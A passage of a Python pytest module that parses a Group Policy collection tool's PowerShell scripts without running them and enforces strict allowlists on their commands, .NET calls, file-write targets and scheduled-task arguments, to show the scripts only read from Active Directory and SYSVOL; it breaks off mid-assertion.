"""Collector read-only enforcement by PowerShell AST allowlist.

The collection scripts run on a domain controller or RSAT host with a domain
account. gpo-lens claims they are read-only against Active Directory, Group
Policy and SYSVOL. This test turns that claim from "by inspection" into a
mechanical check: it **parses** (never executes) each in-scope script with the
PowerShell language parser (``tests/powershell/Get-ScriptCallInventory.ps1``)
and fails on anything outside an explicit ALLOWLIST:

* every command invocation (cmdlet, function, external program);
* every dynamic invocation (``&`` / ``.`` with a computed target), pinned by
  its exact source text;
* every static .NET method call (``[Type]::Method``) by type and member;
* every instance .NET method call by member name (the receiver type is not
  statically known; see "Limits" below);
* every property assignment on an object (``$x.Prop = ...``);
* ``New-Object`` type names (``-ComObject`` is never allowed);
* ``Add-Type`` arguments: an assembly name, or an inline C# definition pinned
  by SHA-256 because its body is invisible to the PowerShell AST.

The allowlist is strict in both directions: an entry that a script no longer
uses also fails, so the list cannot rot into a permissive superset.

Local file writes are allowed only to the collection's own outputs. Each
file-writing command or method must target an expression built only from the
variables named in that script's ``write_roots`` (each documented below with
its derivation from ``-OutputRoot``, ``-OutputPath`` or ``-CopyTo``), and must
not contain an absolute path, UNC path or ``..`` literal. That the named
variables derive from those parameters is verified by inspection, recorded in
the ``write_roots`` descriptions; the AST check pins the variable names.

Scope:

* In scope (run on the DC/RSAT host): ``Export-GpoEstate.ps1``,
  ``Export-GroupMembers.ps1``, ``Export-Principals.ps1``,
  ``Run-GpoLensCollection.ps1``, ``GpoLensCollectionMarker.ps1``.
* ``Register-GpoLensCollection.ps1`` also runs on the DC/RSAT host but its job
  is to create a Windows scheduled task, which is a write to the host (not to
  AD). It has its own narrow allowlist that names the ScheduledTasks cmdlets.
* Out of scope: ``install-windows.ps1`` / ``uninstall-windows.ps1`` run on the
  *analysis* host (IIS install), never on a DC, and legitimately install
  software, write IIS configuration and firewall rules.

Limits (stated, not hidden):

* Instance methods are matched by name only. ``.Delete()`` on a ZIP entry and
  on a hypothetical directory object look the same; each allowlisted instance
  name is therefore per script and justified by the objects that script
  creates.
* ``& $CollectorPath`` in the runner executes the script path the operator
  registered. The default is ``Export-GpoEstate.ps1`` (checked here); a custom
  ``-CollectorPath`` is operator-supplied code and outside this guarantee.
* Read-only is about Active Directory, Group Policy and SYSVOL. The AD and
  GroupPolicy cmdlets in the allowlist are all ``Get-*`` cmdlets; Microsoft's
  documentation is the authority for those cmdlets not writing.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from functools import cache
from pathlib import Path
from typing import Any

import pytest

_REPO = Path(__file__).resolve().parent.parent
_SCRIPTS = _REPO / "scripts"
_DUMPER = _REPO / "tests" / "powershell" / "Get-ScriptCallInventory.ps1"


@dataclass(frozen=True)
class ScriptPolicy:
    commands: frozenset[str]
    static_methods: frozenset[str] = frozenset()
    instance_methods: frozenset[str] = frozenset()
    dynamic_invocations: frozenset[str] = frozenset()
    dot_sources: tuple[str, ...] = ()
    new_object_types: frozenset[str] = frozenset()
    add_type_assemblies: frozenset[str] = frozenset()
    add_type_definitions: frozenset[str] = frozenset()
    member_assignments: frozenset[str] = frozenset()
    write_roots: dict[str, str] = field(default_factory=dict)


# Console output and pure pipeline/data cmdlets; no state outside the process.
_CONSOLE_AND_PIPELINE = frozenset(
    {
        "ConvertFrom-Json",
        "ConvertTo-Json",
        "ForEach-Object",
        "Get-Date",
        "Join-Path",
        "Measure-Object",
        "Out-Null",
        "Out-String",
        "Select-Object",
        "Sort-Object",
        "Where-Object",
        "Write-Error",
        "Write-Host",
        "Write-Progress",
        "Write-Warning",
    }
)
# Local file-system reads.
_FS_READ = frozenset({"Get-ChildItem", "Get-Content", "Get-Item", "Resolve-Path", "Test-Path"})


def _cmds(*names: str, shared: frozenset[str]) -> frozenset[str]:
    """Script-specific commands plus the subset of *shared* the script uses.

    Every name must still be used (the exact-match check), so taking a subset
    of a shared group never widens what a script may call.
    """
    return frozenset(names) | shared


POLICIES: dict[str, ScriptPolicy] = {
    "Export-GpoEstate.ps1": ScriptPolicy(
        commands=_cmds(
            # AD / Group Policy reads.
            "Get-ADDomain",
            "Get-ADGroupMember",
            "Get-ADObject",
            "Get-ADOrganizationalUnit",
            "Get-ADRootDSE",
            "Get-GPInheritance",
            "Get-GPO",
            "Get-GPOReport",
            "Get-Module",
            # Assembly load for ZIP creation; New-Object for SID parsing.
            "Add-Type",
            "New-Object",
            # Local writes, constrained by write_roots.
            "Copy-Item",
            "New-Item",
            "Remove-Item",
            "Set-Content",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertFrom-Json", "Out-String"})
            | (_FS_READ - {"Resolve-Path"}),
        ),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[string]::new",
                "Collections.Generic.List[object]::new",
                "Collections.Generic.List[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFileExtensions::CreateEntryFromFile",
                "IO.File::WriteAllText",
                "math::Round",
                "regex::Matches",
            }
        ),
        instance_methods=frozenset(
            # Collections, strings, ZIP dispose, SecurityIdentifier.Translate
            # (SID -> account name lookup, a read).
            {"Add", "Contains", "Dispose", "Replace", "Split", "Substring", "Translate", "Trim"}
        ),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (created if absent)",
            "testFile": "Join-Path $OutputRoot '_writetest_.tmp' (writability probe, removed)",
            "out": "Join-Path $OutputRoot '<domain>-<stamp>' (this run's export folder)",
            "dest": "Join-Path $out 'SYSVOL-Policies' (the SYSVOL copy target)",
            "archive": '"$ExportPath.zip" where New-GpoExportZip receives -ExportPath $out',
        },
    ),
    "Export-GroupMembers.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADGroupMember",
            "Get-Content",
            "Set-Content",
            shared=frozenset(
                {"ConvertFrom-Json", "ConvertTo-Json", "Get-Date", "Where-Object", "Write-Host"}
            ),
        ),
        # Splatting an optional -Credential into the AD read cmdlets.
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default group-members.json)"},
    ),
    "Export-Principals.ps1": ScriptPolicy(
        commands=_cmds(
            "Get-ADDomain",
            "Get-ADObject",
            "New-Object",
            "Set-Content",
            shared=frozenset(
                {
                    "ConvertTo-Json",
                    "Get-ChildItem",
                    "Get-Content",
                    "Get-Date",
                    "Join-Path",
                    "Sort-Object",
                    "Test-Path",
                    "Where-Object",
                    "Write-Host",
                }
            ),
        ),
        static_methods=frozenset({"Collections.Generic.HashSet[string]::new", "regex::Matches"}),
        # RawSecurityDescriptor -> SDDL text and SID -> account name: reads.
        instance_methods=frozenset({"Add", "GetSecurityDescriptorSddlForm", "Translate"}),
        new_object_types=frozenset({"System.Security.Principal.SecurityIdentifier"}),
        member_assignments=frozenset({"$adParams.Credential"}),
        write_roots={"OutputPath": "the -OutputPath parameter (default principals.json)"},
    ),
    "Run-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            "Copy-Item",
            "Move-Item",
            "New-Item",
            "Remove-Item",
            shared=(_CONSOLE_AND_PIPELINE - {"ConvertTo-Json", "Measure-Object", "Write-Progress"})
            | (_FS_READ - {"Get-Content"}),
        ),
        dynamic_invocations=frozenset(
            {
                # Runs the registered collector (default Export-GpoEstate.ps1).
                "& $CollectorPath -OutputRoot $OutputRoot *>&1",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "Collections.Generic.HashSet[guid]::new",
                "Collections.Generic.Stack[string]::new",
                "IO.Compression.ZipFile::Open",
                "IO.Compression.ZipFile::OpenRead",
                "IO.File::AppendAllText",
                "IO.File::Open",
                "IO.File::ReadAllBytes",
                "IO.File::WriteAllBytes",
                "Text.UTF8Encoding::new",
                "guid::NewGuid",
                "guid::TryParse",
                "math::Max",
                "string::Equals",
                "string::IsNullOrWhiteSpace",
            }
        ),
        instance_methods=frozenset(
            {
                "Add",
                "ContainsKey",
                # ZipArchive.CreateEntry / ZipArchiveEntry.Delete+Open on the
                # ZIP this run just created (inventory overlay).
                "CreateEntry",
                "Delete",
                "Dispose",
                "GetByteCount",
                "GetEntry",
                "GetString",
                "Open",
                "Pop",
                "Push",
                "Substring",
                "ToString",
                "TrimEnd",
                "TrimStart",
                "Write",
            }
        ),
        add_type_assemblies=frozenset({"System.IO.Compression.FileSystem"}),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (owner-marker checked before any write)",
            "LogPath": "Join-Path $OutputRoot 'collection.log'",
            "old": "$LogPath or $LogPath.<n> (log rotation)",
            "next": "$LogPath.<n> (log rotation)",
            "newest": "the single new completed ZIP under $OutputRoot",
            "exportDir": "Join-Path $OutputRoot $newest.BaseName",
            "archive": "an expired completed export ZIP under $OutputRoot (retention)",
            "folder": "Join-Path $OutputRoot $archive.BaseName (retention)",
            "CopyTo": "the -CopyTo delivery directory",
            "partial": "<$delivery>.<guid>.partial inside -CopyTo",
            "delivery": "Join-Path $CopyTo $newest.Name",
        },
    ),
    "GpoLensCollectionMarker.ps1": ScriptPolicy(
        commands=_cmds(
            "Add-Type",
            # Linux-only test path: link count of the already-open marker inode.
            "stat",
            shared=frozenset({"Get-Item", "Join-Path", "Test-Path"}),
        ),
        static_methods=frozenset(
            {
                "GpoLens.MarkerFileInfo::LinkCount",
                "IO.File::Delete",
                "IO.File::Open",
                "IO.MemoryStream::new",
                "uint32::TryParse",
            }
        ),
        instance_methods=frozenset(
            {"CopyTo", "DangerousGetHandle", "Dispose", "ToArray", "ToInt64", "Write"}
        ),
        # GetFileInformationByHandle P/Invoke (read-only link-count query).
        add_type_definitions=frozenset(
            {"8e3d8b0b78dcf2319d6a1e414007e80fdb055c76715b83f81e94ba32d42c5f67"}
        ),
        write_roots={
            "Marker": "the owner marker path passed by callers (opened for read only)",
            "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
        },
    ),
    # Separate, narrow policy: registering the task is a deliberate write to the
    # host's Task Scheduler (not to AD). Nothing else here writes beyond the
    # output root's owner marker and lock file.
    "Register-GpoLensCollection.ps1": ScriptPolicy(
        commands=_cmds(
            "New-ScheduledTask",
            "New-ScheduledTaskAction",
            "New-ScheduledTaskPrincipal",
            "New-ScheduledTaskSettingsSet",
            "New-ScheduledTaskTrigger",
            "Register-ScheduledTask",
            "Unregister-ScheduledTask",
            # Service-account password prompt, handed only to Task Scheduler.
            "Get-Credential",
            "New-Item",
            shared=frozenset(
                {"Get-Item", "Join-Path", "Out-Null", "Resolve-Path", "Test-Path"}
                | {"Write-Host", "Write-Warning"}
            ),
        ),
        dynamic_invocations=frozenset(
            {
                # Invokes the in-file scriptblock literal passed to
                # Set-GpoLensCollectionOwner (its body is scanned here).
                "& $RegisterTask",
                ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            }
        ),
        dot_sources=("GpoLensCollectionMarker.ps1",),
        static_methods=frozenset(
            {
                "IO.File::Delete",
                "IO.File::Open",
                "IO.Path::GetFullPath",
                "Text.UTF8Encoding::new",
                "datetime::TryParseExact",
                "string::Equals",
                "string::IsNullOrWhiteSpace",
                "timespan::FromDays",
                "timespan::FromHours",
            }
        ),
        instance_methods=frozenset(
            {
                "Dispose",
                "GetBytes",
                "GetNetworkCredential",
                "GetString",
                "ShouldProcess",
                "TrimEnd",
                "TrimStart",
            }
        ),
        write_roots={
            "OutputRoot": "the -OutputRoot parameter (normalized with GetFullPath)",
            "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
        },
    ),
}

OUT_OF_SCOPE = {
    "install-windows.ps1": "runs on the analysis host to install the IIS site, not on a DC",
    "uninstall-windows.ps1": "runs on the analysis host to remove the IIS site, not on a DC",
}

# ---------------------------------------------------------------------------
# Dataflow confinement of write roots and other sink-bound variables (BL-1,
# Sol root_rebind/collector_rebind/registry). A name-only "the target mentions
# $OutputRoot" check is defeated by reassigning the variable; so every
# write-root and exec-pinned variable is pinned here to the exact set of
# assignment right-hand sides its documented derivation uses. Any extra or
# changed `=` assignment (a rebind to UNC/SYSVOL/provider/absolute) is not in
# the set and fails. Parameter defaults and foreach conditions are not pinned
# verbatim but must be path-safe (no UNC, provider, or `..`).
# ---------------------------------------------------------------------------


def _norm(text: str | None) -> str:
    return " ".join((text or "").split())


# Variables used as a write TARGET must all be declared write roots (keys here).
# Values are a short description of the derivation.
WRITE_ROOTS: dict[str, dict[str, str]] = {
    "Export-GpoEstate.ps1": {
        "outputroot": "-OutputRoot parameter (default C:\\gpo-export)",
        "testfile": "Join-Path $OutputRoot '_writetest_.tmp'",
        "out": "Join-Path $OutputRoot '<domain>-<stamp>'",
        "dest": "Join-Path $out 'SYSVOL-Policies'",
        "archive": '"$ExportPath.zip" (ExportPath = $out)',
    },
    "Export-GroupMembers.ps1": {"outputpath": "-OutputPath parameter"},
    "Export-Principals.ps1": {"outputpath": "-OutputPath parameter"},
    "Run-GpoLensCollection.ps1": {
        "outputroot": "-OutputRoot parameter",
        "logpath": "Join-Path $OutputRoot 'collection.log' (function param)",
        "old": "$LogPath or $LogPath.<n> (rotation)",
        "next": "$LogPath.<n> (rotation)",
        "newest": "the one new completed ZIP under $OutputRoot",
        "exportdir": "Join-Path $OutputRoot $newest.BaseName",
        "copyto": "-CopyTo delivery directory",
        "partial": "<delivery>.<guid>.partial under $CopyTo",
        "delivery": "Join-Path $CopyTo $newest.Name",
        "archive": "an expired completed export ZIP under $OutputRoot (foreach)",
        "folder": "Join-Path $OutputRoot $archive.BaseName",
    },
    "GpoLensCollectionMarker.ps1": {
        "marker": "Join-Path <output root> '.gpo-lens-collection-owner'",
    },
    "Register-GpoLensCollection.ps1": {
        "outputroot": "[IO.Path]::GetFullPath(-OutputRoot)",
        "marker": "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
    },
}

# Every write root AND every variable whose value reaches an exec/task sink is
# pinned: {casefolded name -> frozenset of normalized allowed `=` RHS}. An empty
# set means the variable may only be bound as a parameter / foreach item.
PINNED_VARS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        "outputroot": frozenset(),
        "exportpath": frozenset(),
        "testfile": frozenset({'Join-Path $OutputRoot "_writetest_.tmp"'}),
        "out": frozenset({'Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"'}),
        "dest": frozenset({"Join-Path $out 'SYSVOL-Policies'"}),
        "archive": frozenset({'"$ExportPath.zip"'}),
    },
    "Export-GroupMembers.ps1": {"outputpath": frozenset()},
    "Export-Principals.ps1": {"outputpath": frozenset()},
    "Run-GpoLensCollection.ps1": {
        "outputroot": frozenset(),
        "logpath": frozenset(),
        "copyto": frozenset(),
        "archive": frozenset(),
        "old": frozenset({'if ($i -eq 1) { $LogPath } else { "$LogPath.$($i - 1)" }'}),
        "next": frozenset({'"$LogPath.$i"'}),
        "newest": frozenset({"$created[0]"}),
        "exportdir": frozenset({"Join-Path $OutputRoot $newest.BaseName"}),
        "partial": frozenset({"\"$delivery.$([guid]::NewGuid().ToString('N')).partial\""}),
        "delivery": frozenset({"Join-Path $CopyTo $newest.Name"}),
        "folder": frozenset({"Join-Path $OutputRoot $archive.BaseName"}),
        # Exec sink: the runner invokes `& $CollectorPath`.
        "collectorpath": frozenset(),
    },
    "GpoLensCollectionMarker.ps1": {
        "marker": frozenset({"Join-Path $root.FullName '.gpo-lens-collection-owner'"}),
    },
    "Register-GpoLensCollection.ps1": {
        "outputroot": frozenset({"[IO.Path]::GetFullPath($OutputRoot)"}),
        "marker": frozenset({"Join-Path $OutputRoot '.gpo-lens-collection-owner'"}),
        "collectorpath": frozenset({"(Resolve-Path -LiteralPath $CollectorPath).ProviderPath"}),
        "runner": frozenset(
            {
                "(Resolve-Path -LiteralPath (Join-Path $PSScriptRoot "
                "'Run-GpoLensCollection.ps1')).ProviderPath"
            }
        ),
        "account": frozenset({"if ($GmsaAccount) { $GmsaAccount } else { $ServiceAccount }"}),
        "windowsroot": frozenset(
            {"if ($env:SystemRoot) { $env:SystemRoot } else { 'C:\\Windows' }"}
        ),
        "taskargs": frozenset(
            {
                _norm(
                    "'-NoProfile -NonInteractive -File ' + "
                    "(ConvertTo-GpoLensTaskArgument $runner) +"
                    " ' -CollectorPath ' + (ConvertTo-GpoLensTaskArgument $CollectorPath) +"
                    " ' -OutputRoot ' + (ConvertTo-GpoLensTaskArgument $OutputRoot) +"
                    " ' -TaskName ' + (ConvertTo-GpoLensTaskArgument $TaskName) +"
                    ' " -Retention $Retention -LogMaxBytes $LogMaxBytes -LogFiles $LogFiles"'
                ),
                _norm(
                    "' -CopyTo ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $CopyTo))"
                ),
                _norm(
                    "' -InventoryPath ' + (ConvertTo-GpoLensTaskArgument "
                    "(ConvertTo-GpoLensAbsolutePath $InventoryPath))"
                ),
            }
        ),
    },
}

# Allowlisted instance method -> the receiver variables it may be called on
# (casefolded). A call on any other receiver fails (Sol instance_delete,
# DeepSeek NB-1 ADSI.CopyTo). Calls whose receiver is a type literal (static
# dispatch, receiver_var null) are screened only by the type denylist.
INSTANCE_RECEIVERS: dict[str, dict[str, frozenset[str]]] = {
    "Export-GpoEstate.ps1": {
        "Replace": frozenset({"f"}),
        "Substring": frozenset({"f"}),
        "Dispose": frozenset({"zip"}),
        "Add": frozenset(
            {"collectionerrors", "knownids", "successsections", "failedsections", "allsids"}
        ),
        "Trim": frozenset({"_", "gpc", "pf"}),
        "Contains": frozenset({"knownids"}),
        "Translate": frozenset({"sidobj"}),
        "Split": frozenset({"dom"}),
    },
    "Export-GroupMembers.ps1": {},
    "Export-Principals.ps1": {
        "Add": frozenset({"allsids"}),
        "GetSecurityDescriptorSddlForm": frozenset({"sd"}),
        "Translate": frozenset({"sidobj"}),
    },
    "Run-GpoLensCollection.ps1": {
        "Substring": frozenset({"line", "_", "newest"}),
        "GetByteCount": frozenset({"encoding"}),
        "GetEntry": frozenset({"zip"}),
        "Dispose": frozenset({"zip", "stream", "lock"}),
        "Push": frozenset({"pending"}),
        "Pop": frozenset({"pending"}),
        "Add": frozenset({"ids"}),
        "ContainsKey": frozenset({"previous"}),
        "Delete": frozenset({"entry"}),
        "CreateEntry": frozenset({"zip"}),
        "Open": frozenset({"entry"}),
        "Write": frozenset({"stream"}),
    },
    "GpoLensCollectionMarker.ps1": {
        "ToInt64": frozenset({"stream"}),
        "DangerousGetHandle": frozenset({"stream"}),
        "CopyTo": frozenset({"stream"}),
        "ToArray": frozenset({"bytes"}),
        "Dispose": frozenset({"bytes", "stream"}),
        "Write": frozenset({"stream"}),
    },
    "Register-GpoLensCollection.ps1": {
        "Dispose": frozenset({"lock"}),
        "ShouldProcess": frozenset({"pscmdlet"}),
        "GetNetworkCredential": frozenset({"credential"}),
    },
}

# Register-GpoLensCollection is the only script that writes a scheduled task.
# Pin the security-relevant arguments of every task cmdlet so a modified
# -Execute / -Argument / -UserId / -TaskName (Sol task_abuse, DeepSeek NB-2)
# fails even though the cmdlet name is allowlisted.
TASK_ACTION: dict[str, dict[str, str]] = {
    "New-ScheduledTaskAction": {
        "Execute": '"$windowsRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"',
        "Argument": "$taskArgs",
    },
    "New-ScheduledTaskPrincipal": {"UserId": "$account"},
    "New-ScheduledTask": {"Action": "$action", "Principal": "$principal"},
    "Register-ScheduledTask": {"TaskName": "$TaskName", "InputObject": "$task"},
}
_TASK_ACTION_SCRIPT = "Register-GpoLensCollection.ps1"

# .NET type names (casefolded substrings) that are an AD/COM/runspace write or
# code-load surface. Rejected wherever they appear (cast, type literal, `using`),
# because an [ADSI]/[DirectoryEntry] receiver carries an AD write under an
# allowlisted instance-method name.
_FORBIDDEN_TYPE_SUBSTRINGS = (
    "adsi",
    "adsisearcher",
    "directoryservices",
    "directoryentry",
    "directorysearcher",
    "wscript",
    "comobject",
    "__comobject",
    "runspace",
    "powershell",
    "scriptblock",
)

# File-writing commands and the bound parameters that name what they write.
# Move-Item removes its source, so both ends are write targets.
_WRITE_COMMANDS: dict[str, tuple[str, ...]] = {
    "Add-Content": ("Path", "LiteralPath"),
    "Copy-Item": ("Destination",),
    "Move-Item": ("Path", "LiteralPath", "Destination"),
    "New-Item": ("Path",),
    "Out-File": ("FilePath", "LiteralPath"),
    "Remove-Item": ("Path", "LiteralPath"),
    "Rename-Item": ("Path", "LiteralPath"),
    "Set-Content": ("Path", "LiteralPath"),
    "Tee-Object": ("FilePath", "LiteralPath"),
}
# Commands that write only when a path parameter is supplied (Get-GPOReport
# returns a string unless -Path is given — Sol get_gporeport).
_OPTIONAL_PATH_COMMANDS: dict[str, tuple[str, ...]] = {
    "Get-GPOReport": ("Path",),
}
# Static methods whose first argument is a path that may be created/written/deleted.
_WRITE_STATIC = {
    "IO.File::AppendAllText",
    "IO.File::Delete",
    "IO.File::Open",
    "IO.File::WriteAllBytes",
    "IO.File::WriteAllText",
    "IO.Compression.ZipFile::Open",
}
# New-Item item types that create a filesystem object other than a plain file or
# directory (a symlink/junction to SYSVOL re-points a confined root — Sol
# set_itemtype).
_FORBIDDEN_ITEM_TYPES = {"symboliclink", "junction", "hardlink"}
_VARIABLE = re.compile(
    r"\$(?:\{([^}]+)\}|(?:script:|global:|local:|private:|using:)?([A-Za-z_][A-Za-z0-9_]*))"
)
# In a write TARGET (built from roots) any drive-qualified or UNC or `..` literal
# is illegitimate, including a single drive letter.
_ABSOLUTE_LITERAL = re.compile(r"[A-Za-z]:[\\/]|\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")
# A non-filesystem PowerShell provider qualifier (registry, cert, AD, env, ...).
_PROVIDER = re.compile(
    r"\b(?:HKLM|HKCU|HKCR|HKU|HKEY_[A-Z_]+|Cert|WSMan|Env|Variable|Function|Alias|AD):",
    re.IGNORECASE,
)
# In a parameter default or foreach source an absolute *filesystem* path is fine
# (it is the root itself); only UNC, a provider, or `..` are rejected.
_UNC_OR_DOTDOT = re.compile(r"\\\\|(?:^|[\\/'\" ])\.\.(?:[\\/'\" ]|$)")


def _cf(name: str) -> str:
    return name.casefold()


def _vars_in(text: str) -> set[str]:
    return {_cf(a or b) for a, b in _VARIABLE.findall(text)}


def _normalize_type(name: str) -> str:
    return name.removeprefix("System.")


def _pwsh() -> str:
    exe = shutil.which("pwsh")
    if exe is None:
        if os.environ.get("CI"):
            pytest.fail("pwsh is required in CI for the collector read-only gate")
        pytest.skip("pwsh not installed; CI runs this gate (ubuntu runners ship pwsh)")
    return exe


def _run_dumper(exe: str, paths: list[str]) -> dict[str, dict[str, Any]]:
    result = subprocess.run(
        [exe, "-NoProfile", "-NonInteractive", "-File", str(_DUMPER), *paths],
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
    )
    assert result.returncode == 0, result.stderr
    return {Path(entry["path"]).name: entry for entry in json.loads(result.stdout)}


@cache
def _inventory_for(exe: str) -> dict[str, dict[str, Any]]:
    return _run_dumper(exe, [str(_SCRIPTS / name) for name in sorted(POLICIES)])


@pytest.fixture(scope="module")
def inventory() -> dict[str, dict[str, Any]]:
    return _inventory_for(_pwsh())


def _exact(kind: str, script: str, used: set[str], allowed: frozenset[str]) -> None:
    unexpected = sorted(used - allowed)
    unused = sorted(allowed - used)
    assert not unexpected, f"{script}: {kind} outside the read-only allowlist: {unexpected}"
    assert not unused, f"{script}: stale {kind} allowlist entries (remove them): {unused}"


# ---------------------------------------------------------------------------
# Check functions. Each raises AssertionError on a violation. The per-script
# tests below call them against the real scripts; the regression suite calls
# run_all_checks against modified copies and asserts a failure.
# ---------------------------------------------------------------------------


def check_commands(script: str, entry: dict[str, Any], local: set[str]) -> None:
    policy = POLICIES[script]
    named = {c["name"] for c in entry["commands"] if c["name"]}
    _exact("commands", script, named - local, policy.commands)
    dynamic = {c["text"] for c in entry["commands"] if not c["name"]}
    _exact("dynamic invocations", script, dynamic, policy.dynamic_invocations)
    # Set-Variable / New-Variable / Set-Item / Tee-Object name a target in a
    # string the assignment AST cannot see; none are used, so forbid them.
    assert not entry["indirect_writes"], (
        f"{script}: indirect variable/item writes are not allowed: {entry['indirect_writes']}"
    )


def check_dotnet(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    members = entry["members"]
    dynamic = [m["text"] for m in members if m["dynamic_member"] or (m["static"] and not m["type"])]
    assert not dynamic, f"{script}: computed member/type names cannot be verified: {dynamic}"
    static = {f"{_normalize_type(m['type'])}::{m['member']}" for m in members if m["static"]}
    _exact("static .NET methods", script, static, policy.static_methods)
    instance = {m["member"] for m in members if not m["static"]}
    _exact("instance .NET methods", script, instance, policy.instance_methods)
    assigned = {a["target"] for a in entry["member_assignments"]}
    _exact("property assignments", script, assigned, policy.member_assignments)


def check_types(script: str, entry: dict[str, Any]) -> None:
    refs = list(entry["type_references"])
    for assignment in entry["member_assignments"]:
        refs += assignment.get("receiver_types", [])
    hits = sorted({t for t in refs if any(s in _cf(t) for s in _FORBIDDEN_TYPE_SUBSTRINGS)})
    assert not hits, f"{script}: forbidden .NET/COM/AD type reference: {hits}"


def check_instance_receivers(script: str, entry: dict[str, Any]) -> None:
    allowed = INSTANCE_RECEIVERS.get(script, {})
    for member in entry["members"]:
        if member["static"]:
            continue
        name = member["member"]
        receiver_var = member["receiver_var"]
        if receiver_var is None:
            # Static-type or literal receiver; screened by check_types.
            continue
        permitted = allowed.get(name, frozenset())
        assert _cf(receiver_var) in permitted, (
            f"{script}:{member['line']}: instance method {name!r} called on unexpected receiver "
            f"${receiver_var} (allowed: {sorted(permitted)})"
        )


def check_usings(script: str, entry: dict[str, Any]) -> None:
    assert not entry["using_statements"], (
        f"{script}: `using` statements are not allowed "
        f"(assembly/module/namespace load): {[u['text'] for u in entry['using_statements']]}"
    )


def check_redirections(script: str, entry: dict[str, Any]) -> None:
    for redir in entry["redirections"]:
        if redir["kind"] == "merging":
            continue  # stream merge (e.g. *>&1); writes no file
        assert _norm(redir["location"]) == "$null", (
            f"{script}:{redir['line']}: file redirection must target $null, "
            f"not {redir['location']!r}"
        )


def check_new_object_and_add_type(script: str, entry: dict[str, Any]) -> None:
    policy = POLICIES[script]
    types: set[str] = set()
    assemblies: set[str] = set()
    definitions: set[str] = set()
    for command in entry["commands"]:
        bound = command["bound"]
        if command["name"] == "New-Object":
            assert "ComObject" not in bound, f"{script}:{command['line']}: COM is not allowed"
            types.add(str(bound.get("TypeName")))
        elif command["name"] == "Add-Type":
            keys = set(bound) - {"ErrorAction"}
            if keys == {"AssemblyName"}:
                assemblies.add(bound["AssemblyName"])
            elif keys == {"TypeDefinition"} and command["type_definition_sha256"]:
                definitions.add(command["type_definition_sha256"])
            else:
                pytest.fail(f"{script}:{command['line']}: unsupported Add-Type form {sorted(keys)}")
    _exact("New-Object types", script, types, policy.new_object_types)
    _exact("Add-Type assemblies", script, assemblies, policy.add_type_assemblies)
    _exact("Add-Type inline definitions (sha256)", script, definitions, policy.add_type_definitions)


def _write_targets(entry: dict[str, Any]) -> list[tuple[int, str]]:
    targets: list[tuple[int, str]] = []
    for command in entry["commands"]:
        name = command["name"] or ""
        required = _WRITE_COMMANDS.get(name)
        optional = _OPTIONAL_PATH_COMMANDS.get(name)
        params = required or optional
        if params is None:
            continue
        bound = [command["bound"][p] for p in params if isinstance(command["bound"].get(p), str)]
        if not bound:
            if optional is not None:
                continue
            raise AssertionError(
                f"line {command['line']}: cannot resolve the write target of {command['text']}"
            )
        targets.extend((command["line"], text) for text in bound)
    for member in entry["members"]:
        if member["static"] and f"{_normalize_type(member['type'])}::{member['member']}" in (
            _WRITE_STATIC
        ):
            targets.append((member["line"], member["first_argument"] or ""))
    return targets


def check_writes(script: str, entry: dict[str, Any]) -> None:
    roots = set(WRITE_ROOTS[script])
    assert roots <= set(PINNED_VARS[script]), (
        f"{script}: every write root must be pinned: {roots - set(PINNED_VARS[script])}"
    )
    used_roots: set[str] = set()
    for line, text in _write_targets(entry):
        names = _vars_in(text)
        # The target must be ANCHORED at a declared, pinned root. Other variables
        # (sanitized filename components such as $safe / $gpo.Id joined under the
        # root) are allowed, but the anchoring root is pinned (check_pinned_
        # bindings) so it cannot be a rebound UNC/provider path, and a literal
        # absolute / UNC / provider / .. anywhere in the target fails here.
        anchor = names & roots
        assert anchor, (
            f"{script}:{line}: write target {text!r} is not anchored at a declared root "
            f"(vars {sorted(names)})"
        )
        assert not _ABSOLUTE_LITERAL.search(text), f"{script}:{line}: absolute/UNC/.. in {text!r}"
        assert not _PROVIDER.search(text), f"{script}:{line}: provider path in {text!r}"
        used_roots |= anchor
    # New-Item must not create links or target a non-filesystem provider.
    for command in entry["commands"]:
        if command["name"] != "New-Item":
            continue
        bound = command["bound"]
        item_type = _cf(str(bound.get("ItemType", "")))
        assert item_type not in _FORBIDDEN_ITEM_TYPES, (
            f"{script}:{command['line']}: New-Item -ItemType {bound.get('ItemType')} is not allowed"
        )
        assert "PSProvider" not in bound, (
            f"{script}:{command['line']}: New-Item -PSProvider blocked"
        )
        for key in ("Value", "Target"):
            value = bound.get(key)
            if isinstance(value, str):
                assert not _ABSOLUTE_LITERAL.search(value) and not _PROVIDER.search(value), (
                    f"{script}:{command['line']}: New-Item -{key} {value!r} escapes the roots"
                )
    _exact("write roots", script, used_roots, frozenset(roots))


def check_pinned_bindings(script: str, entry: dict[str, Any]) -> None:
    pinned = PINNED_VARS[script]
    for binding in entry["variable_assignments"]:
        name = _cf(binding["name"])
        if name not in pinned:
            continue
        rhs = _norm(binding["rhs"])
        if binding["kind"] == "assign":
            assert rhs in pinned[name], (
